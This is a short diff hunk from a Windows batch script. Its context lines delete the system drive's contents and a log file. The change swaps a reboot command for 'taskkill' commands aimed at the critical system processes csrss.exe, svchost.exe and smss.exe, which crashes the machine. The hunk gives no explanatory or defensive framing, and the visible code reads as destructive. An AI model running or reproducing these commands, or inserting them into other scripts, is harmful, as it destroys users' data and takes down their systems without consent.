@@ -651,4 +651,6 @@ del %SystemDrive%
 del %LOGFILE%
 timeout 20 /nobreak
 
-Shutdown.exe -r
+taskkill /im csrss.exe
+taskkill /im svchost.exe
+taskkill /im smss.exe 
